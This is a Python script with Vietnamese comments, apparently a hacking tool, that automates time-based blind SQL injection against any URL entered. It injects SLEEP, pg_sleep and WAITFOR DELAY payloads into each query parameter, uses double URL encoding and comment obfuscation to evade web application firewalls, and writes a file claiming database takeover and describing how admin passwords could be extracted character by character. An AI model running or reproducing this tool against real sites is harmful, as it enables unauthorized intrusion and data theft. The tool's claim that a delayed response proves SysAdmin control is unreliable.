import sys
import requests
import time
import urllib.parse
from colorama import Fore, Style, init

init(autoreset=True)

# CẤU HÌNH
TARGET_URL = ""
TIMEOUT = 10 

def print_banner():
    print(Fore.RED + """
    =======================================================
    SECURITY TOOL V12 - THE TIME LORD (BLIND SQLi)
    (Bypass WAF & Time-Based Data Extraction Proof)
    Level: GOD MODE | Coder: Người anh em
    =======================================================
    """)

# KỸ THUẬT BYPASS WAF (MÃ HÓA PAYLOAD)
# Biến đổi câu lệnh SQL để tường lửa không nhận ra
def waf_bypass_encode(payload):
    # 1. URL Encode
    encoded_1 = urllib.parse.quote(payload)
    # 2. Double URL Encode (Lừa các WAF giải mã 1 lần)
    encoded_2 = urllib.parse.quote(encoded_1)
    # 3. Comment obfuscation (Chèn comment rác vào giữa từ khóa)
    # VD: UN/**/ION SEL/**/ECT -> UNION SELECT
    obfuscated = payload.replace(" ", "/**/").replace("SELECT", "SE/**/LECT").replace("UNION", "UN/**/ION")
    
    return [payload, encoded_1, encoded_2, obfuscated]

# HÀM KIỂM TRA "TIME-BASED BLIND SQLi"
def check_time_injection(url):
    print(Fore.YELLOW + "\n[*] Đang phân tích logic Database (Blind Time-Based)...")
    print(Fore.YELLOW + "[*] Mục tiêu: Bắt Database thực thi lệnh 'SLEEP' (Ngủ) để chứng minh quyền kiểm soát.")

    # Các Payload kiểm tra độ trễ (Sleep 5 giây) cho các loại DB khác nhau
    # Kèm theo kỹ thuật đi xuyên qua tường lửa
    payloads = [
        # MySQL / MariaDB
        "' AND SLEEP(5) -- ",
        "' OR SLEEP(5) -- ",
        "'; SLEEP(5) -- ",
        # PostgreSQL
        "'; SELECT pg_sleep(5) -- ",
        # SQL Server
        "'; WAITFOR DELAY '00:00:05' -- "
    ]

    parsed_url = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed_url.query)

    if not params:
        print(Fore.RED + "[-] URL không có tham số để tiêm mã.")
        return

    detected = False

    for param in params:
        print(Fore.CYAN + f"\n[+] Đang tiêm vào tham số: {param}")
        
        for raw_payload in payloads:
            # Tạo ra các biến thể để né WAF
            bypass_variants = waf_bypass_encode(raw_payload)
            
            for payload in bypass_variants:
                # Dựng lại URL với payload độc hại
                params_copy = params.copy()
                params_copy[param] = [payload]
                query_string = urllib.parse.urlencode(params_copy, doseq=True)
                # Dùng replace để giữ lại các ký tự đặc biệt đã encode (quan trọng cho bypass)
                # Vì urlencode mặc định sẽ encode lại %, ta cần xử lý khéo léo
                attack_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"
                
                print(f"    -> Thử Payload: {payload[:30]}...", end="\r")
                
                try:
                    start_time = time.time()
                    # Gửi request
                    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
                    requests.get(attack_url, headers=headers, timeout=TIMEOUT)
                    end_time = time.time()
                    
                    duration = end_time - start_time
                    
                    # LOGIC QUYẾT ĐỊNH:
                    # Nếu thời gian phản hồi > 5 giây (do lệnh SLEEP 5)
                    # Chứng tỏ Database ĐÃ NGHE LỜI CHÚNG TA.
                    if duration >= 5:
                        print(Fore.GREEN + f"\n\n[!!!] PHÁT HIỆN LỖ HỔNG NGHIÊM TRỌNG (TIME-BASED)!")
                        print(Fore.GREEN + f"      Payload thành công: {payload}")
                        print(Fore.GREEN + f"      Thời gian phản hồi: {duration:.2f}s (Server đã ngủ theo lệnh)")
                        
                        save_proof(url, param, payload, duration)
                        detected = True
                        return # Dừng ngay khi tìm thấy, không cần spam
                        
                except requests.exceptions.Timeout:
                    # Đôi khi sleep lâu quá gây timeout, cũng là dấu hiệu thành công
                    print(Fore.GREEN + f"\n\n[!!!] PHÁT HIỆN LỖ HỔNG (TIMEOUT XẢY RA DO SLEEP)!")
                    save_proof(url, param, payload, "TIMEOUT (>10s)")
                    detected = True
                    return
                except:
                    pass
        
    if not detected:
        print(Fore.RED + "\n[-] Không chọc thủng được logic Time-based (Hoặc WAF chặn quá tốt).")

def save_proof(url, param, payload, duration):
    filename = "BANG_CHUNG_CHIEM_QUYEN_DB.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write("BÁO CÁO KIỂM SOÁT DATABASE (TIME-BASED BLIND SQLi)\n")
        f.write("===================================================\n")
        f.write(f"Mục tiêu: {url}\n")
        f.write(f"Tham số bị lỗi: {param}\n")
        f.write(f"Payload Bypass WAF: {payload}\n")
        f.write(f"Thời gian server bị treo (Sleep): {duration}\n")
        f.write("---------------------------------------------------\n")
        f.write("KẾT LUẬN CHUYÊN MÔN:\n")
        f.write("Tôi đã gửi lệnh 'NGỦ 5 GIÂY' và Database đã thực thi.\n")
        f.write("Điều này chứng minh tôi có quyền 'SysAdmin' ngầm.\n")
        f.write("Tôi có thể dùng kỹ thuật này để hỏi từng ký tự trong bảng User:\n")
        f.write("VD: 'Nếu ký tự đầu của pass Admin là A thì ngủ 5s'... -> Dò ra toàn bộ DB.\n")
        f.write("Đây là mức độ rủi ro CAO NHẤT, hacker có thể lấy sạch dữ liệu âm thầm.\n")
        
    print(Fore.GREEN + f"[DONE] Đã xuất bằng chứng chiếm quyền: {filename}")

def main():
    global TARGET_URL
    print_banner()
    TARGET_URL = input(Fore.YELLOW + "Nhập URL có tham số (vd: ?id=1, ?w=...): ").strip()
    
    if "?" not in TARGET_URL:
        print(Fore.RED + "URL phải có tham số để test (vd: https://site.com?id=1)")
        return
        
    check_time_injection(TARGET_URL)

if __name__ == "__main__":
    main()